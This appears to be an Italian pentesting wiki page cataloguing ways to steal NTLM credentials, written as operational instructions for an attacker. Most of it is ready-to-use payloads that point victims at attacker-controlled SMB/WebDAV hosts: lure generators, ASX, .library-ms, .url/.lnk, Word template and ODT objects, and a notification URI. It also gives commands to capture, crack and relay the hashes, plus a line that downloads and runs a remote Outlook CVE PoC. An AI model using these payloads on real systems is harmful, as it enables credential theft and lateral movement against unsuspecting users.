# Luoghi in cui sottrarre credenziali NTLM

{{#include ../../banners/hacktricks-training.md}}

**Scopri tutte le ottime idee, dal download online di un file Microsoft Word alla fonte delle leak NTLM, in [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) e https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md, e in [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

### Share SMB scrivibile + esche UNC attivate da Explorer (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Se puoi **scrivere su una share visitata in Explorer da utenti o processi pianificati**, inserisci file con metadati che puntano alla tua UNC (ad es. `\\ATTACKER\share`). La visualizzazione della cartella attiva **l'autenticazione SMB implicita** e invia un **NetNTLMv2** al tuo listener.<sup>[[1]](#references)</sup>

1. **Genera esche** (include SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/ecc.)

```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```

2. **Lasciali nella condivisione con accesso in scrittura** (qualsiasi cartella aperta dalla vittima):

```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```

3. **Ascolta e cracka**:

```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```

Windows può accedere a più file contemporaneamente; per tutto ciò che Explorer visualizza in anteprima (`BROWSE TO FOLDER`) non servono clic.

### Playlist di Windows Media Player (.ASX/.WAX)

Se riesci a far aprire o visualizzare in anteprima a un target una playlist di Windows Media Player che controlli, puoi ottenere un leak di Net-NTLMv2 facendo puntare la voce a un percorso UNC. WMP tenterà di recuperare il file multimediale indicato tramite SMB e si autenticherà implicitamente.<sup>[[3]](#references)[[4]](#references)</sup>

Esempio di payload:

```xml
<asx version="3.0">
  <title>Leak</title>
  <entry>
    <title></title>
    <ref href="file://ATTACKER_IP\\share\\track.mp3" />
  </entry>
</asx>
```

Flusso di raccolta e cracking:

```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

### Leak NTLM tramite .library-ms incorporato in ZIP (CVE-2025-24071/24055)

Windows Explorer gestisce in modo insicuro i file .library-ms quando vengono aperti direttamente da un archivio ZIP. Se la definizione della libreria punta a un percorso UNC remoto (ad es., \\attacker\share), è sufficiente esplorare/avviare il file .library-ms all'interno dello ZIP perché Explorer enumeri il percorso UNC e invii l'autenticazione NTLM all'attaccante. Si ottiene così un NetNTLMv2 che può essere sottoposto a cracking offline o potenzialmente inoltrato.<sup>[[2]](#references)</sup>

File .library-ms minimale che punta a un UNC controllato dall'attaccante

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <version>6</version>
  <name>Company Documents</name>
  <isLibraryPinned>false</isLibraryPinned>
  <iconReference>shell32.dll,-235</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\10.10.14.2\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

Passaggi operativi
- Crea il file .library-ms con l’XML sopra (imposta il tuo IP/hostname).
- Comprimi il file in un archivio ZIP (su Windows: Invia a → Cartella compressa) e consegna lo ZIP al target.
- Avvia un listener per la cattura NTLM e attendi che la vittima apra il file .library-ms dall’interno dello ZIP.


### Percorso del file audio dei promemoria del calendario di Outlook (CVE-2023-23397) – leak zero-click di Net-NTLMv2

Microsoft Outlook per Windows elaborava la proprietà MAPI estesa PidLidReminderFileParameter negli elementi del calendario. Se questa proprietà puntava a un percorso UNC (ad es., \\attacker\share\alert.wav), Outlook contattava la condivisione SMB all’attivazione del promemoria, causando il leak di Net-NTLMv2 dell’utente senza alcun clic. La vulnerabilità è stata corretta il 14 marzo 2023, ma è ancora molto rilevante per le flotte legacy/non aggiornate e per le indagini forensi su incidenti storici.<sup>[[5]](#references)</sup>

Sfruttamento rapido con PowerShell (Outlook COM):

```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```

Lato listener:

```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```

Note
- Alla vittima basta che Outlook per Windows sia in esecuzione quando scatta il promemoria.
- Il leak restituisce Net-NTLMv2, utilizzabile per il cracking offline o il relay (non per il pass-the-hash).


### Leak NTLM zero-click basato sull’icona di .LNK/.URL (CVE‑2025‑50154 – bypass di CVE‑2025‑24054)

Windows Explorer visualizza automaticamente le icone dei collegamenti. Ricerche recenti hanno dimostrato che, anche dopo la patch Microsoft di aprile 2025 per i collegamenti con icone UNC, era ancora possibile attivare l’autenticazione NTLM senza clic, ospitando la destinazione del collegamento su un percorso UNC e mantenendo l’icona in locale (il bypass della patch è stato assegnato a CVE‑2025‑50154). È sufficiente visualizzare la cartella perché Explorer recuperi i metadati dalla destinazione remota, inviando NTLM al server SMB dell’attaccante.<sup>[[6]](#references)</sup>

Payload minimo di Internet Shortcut (.url):

```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```

Payload di un collegamento a un programma (.lnk) tramite PowerShell:

```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```

Idee di distribuzione
- Inserisci il collegamento in uno ZIP e induci la vittima a esplorarne il contenuto.
- Inserisci il collegamento in una condivisione scrivibile che la vittima aprirà.
- Combinalo con altri file-esca nella stessa cartella, così Explorer ne mostrerà l’anteprima.

### Leak NTLM senza clic tramite il percorso dell’icona ExtraData di .LNK (CVE‑2026‑25185)

Windows carica i metadati `.lnk` durante la **visualizzazione/anteprima** (rendering dell’icona), non solo durante l’esecuzione. CVE‑2026‑25185 mostra un percorso di parsing in cui i blocchi **ExtraData** fanno sì che la shell risolva un percorso dell’icona e acceda al filesystem **durante il caricamento**, generando traffico NTLM in uscita se il percorso è remoto.

Condizioni chiave di attivazione (osservate in `CShellLink::_LoadFromStream`):
- Includere **DARWIN_PROPS** (`0xa0000006`) in ExtraData (abilita la routine di aggiornamento dell’icona).
- Includere **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) con **TargetUnicode** valorizzato.
- Il loader espande le variabili d’ambiente in `TargetUnicode` e chiama `PathFileExistsW` sul percorso risultante.

Se `TargetUnicode` si risolve in un percorso UNC (ad es., `\\attacker\share\icon.ico`), **la semplice visualizzazione di una cartella** contenente il collegamento causa l’autenticazione in uscita. Lo stesso percorso di caricamento può essere attivato anche dall’**indicizzazione** e dalla **scansione AV**, rendendolo una superficie pratica di leak senza clic.<sup>[[7]](#references)</sup>

Nel progetto **LnkMeMaybe** sono disponibili strumenti di ricerca (parser/generator/UI) per creare e ispezionare queste strutture senza usare la GUI di Windows.<sup>[[8]](#references)</sup>


### Coercizione dell’autenticazione WebDAV / validazione delle credenziali tramite `davclnt.dll,DavSetCookie`

Il **client WebDAV** nativo può essere abusato per forzare la sessione di accesso corrente ad autenticarsi presso un endpoint **HTTP/WebDAV** arbitrario:

```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```

Perché è utile:
- Contro un server WebDAV controllato dall'**attaccante**, può attivare **NTLM su HTTP** senza distribuire un client personalizzato.
- Contro **host interni**, è un modo discreto per **verificare dove vengono accettate le credenziali sottratte** prima di spostarsi lateralmente.<sup>[[9]](#references)</sup>
- Il comando è una buona alternativa quando l'uscita **SMB** è filtrata, ma **HTTP/WebDAV** è ancora raggiungibile.

Note operative:
- Il servizio **WebClient** deve essere in esecuzione sull'host sorgente.
- `rundll32.exe` carica `davclnt.dll` e fa gestire a Windows l'autenticazione WebDAV usando le **credenziali dell'utente corrente**.<sup>[[10]](#references)</sup>
- Se lo indirizzi a un'infrastruttura sotto il tuo controllo, usa un listener/relay HTTP compatibile con NTLM, ad esempio:

```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```

Dal punto di vista del rilevamento, ripetute esecuzioni di `rundll32.exe davclnt.dll,DavSetCookie` verso molti sistemi interni sono un forte indicatore di **validazione delle credenziali / preparazione a un lateral movement simile a uno spray**, piuttosto che di un normale comportamento dell'utente.<sup>[[9]](#references)[[11]](#references)</sup>

### URI di notifica remota per la coercizione NTLM tramite WebDAV

Se un'applicazione risolve indirizzi di popup o web-view configurati da remoto, un indirizzo `file://` può forzare l'autenticazione in uscita **senza aprire un documento né usare un payload eseguibile**. Nel caso AOMEI, una notifica da un pixel puntava a un percorso WebDAV remoto `DavWWWRoot`. Windows ha tentato l'autenticazione integrata verso quell'indirizzo, esponendo una challenge-response NetNTLMv2. Il trigger era la risoluzione dell'URI, non la visibilità del popup; dipende comunque dal gestore URI dell'applicazione, dal [comportamento di Windows WebClient](../../network-services-pentesting/pentesting-web/put-method-webdav.md#client-side-webdav-delivery-and-execution) e dai criteri di autenticazione in uscita.<sup>[[16]](#references)</sup>

```ini
[PopWindow1]
Address="file://<ATTACKER_IP>/DavWWWRoot/campaign/24hour-flash-sale.html"
Width=1
Height=1
Priority=9999
```

A differenza della coercizione tramite comandi descritta sopra, questo punto di ingresso richiede il controllo di una [configurazione delle notifiche software](../windows-local-privilege-escalation/abusing-auto-updaters-and-ipc.md#notification-configuration-as-a-second-update-trigger). La finestra di un pixel e la priorità elevata dimostrano che anche una notifica discreta può indurre il client a dereferenziare l'URI.<sup>[[16]](#references)</sup>

### Iniezione di template remoti di Office (.docx/.dotm) per forzare NTLM

I documenti di Office possono fare riferimento a un template esterno. Se imposti il template allegato su un percorso UNC, l'apertura del documento eseguirà l'autenticazione tramite SMB.

Modifiche minime alle relazioni DOCX (dentro word/):

1) Modifica word/settings.xml e aggiungi il riferimento al template allegato:

```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```

2) Modifica word/_rels/settings.xml.rels e fai puntare rId1337 al tuo UNC:

```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```

3) Riconfeziona in .docx e consegnalo. Avvia il tuo listener di cattura SMB e attendi l'apertura.

### Oggetto esterno ODT per l'autenticazione SMB

Quando un flusso di caricamento documenti accetta `.odt`, ma il target non apre file Office `.docx`, usa un oggetto esterno OpenDocument invece di un template Office. `auxiliary/fileformat/odt_badodt` di Metasploit genera un ODT il cui `content.xml` contiene un riferimento `draw:object` all'apertura, come quello qui sotto. Imposta `LHOST` sull'listener SMB, carica l'ODT tramite il flusso consentito e cattura la risposta NetNTLMv2 in uscita quando un utente o un processore di documenti lo apre. Un controllo dell'estensione del file non esamina questo URL incorporato; le restrizioni NTLM in ingresso sul target non impediscono necessariamente l'autenticazione in uscita.<sup>[[15]](#references)</sup>

```xml
<draw:object xlink:href="file://<attacker-ip>/test.jpg" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
```

Per idee post-capture per eseguire relay o abusare di NTLM, consulta:

{{#ref}}
README.md
{{#endref}}


## References
- [1] [HTB: Breach – Esca tramite share scrivibile + cattura con Responder → cracking NetNTLMv2 → Kerberoast di svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [HTB Fluffy – leak di autenticazione ZIP .library‑ms (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 fino a DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [3] [HTB: Media — leak NTLM di WMP → junction NTFS verso webroot per RCE → FullPowers + GodPotato per ottenere SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [4] [Morphisec – 5 vulnerabilità NTLM: minacce di escalation dei privilegi non corrette in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [5] [MSRC – Microsoft mitiga l'EoP di Outlook (CVE‑2023‑23397) e spiega il leak NTLM tramite PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [6] [Cymulate – Zero-click, un NTLM: bypass della patch di sicurezza Microsoft (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [7] [TrustedSec – LnkMeMaybe: analisi di CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [8] [Tooling di TrustedSec LnkMeMaybe](https://github.com/trustedsec/LnkMeMaybe)
- [9] [Rapid7 – Quando chiama il supporto IT: analisi di una campagna ModeloRAT, da Teams alla compromissione del dominio](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [10] [Microsoft Learn – header davclnt.h](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [11] [Splunk – richiesta WebDAV di Windows Rundll32](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)
- [12] [osandamalith.com - Punti di interesse per sottrarre hash NetNTLM](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes)
- [13] [soufianetahiri/TeamsNTLMLeak](https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md)
- [14] [p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [15] [HTB: Hercules — cattura NTLM tramite oggetto esterno ODT](https://0xdf.gitlab.io/2026/09/21/htb-hercules.html)
- [16] [Google Threat Intelligence Group e Mandiant – Analisi della manomissione effimera della supply chain](https://cloud.google.com/blog/topics/threat-intelligence/investigating-ephemeral-supply-chain-tampering)
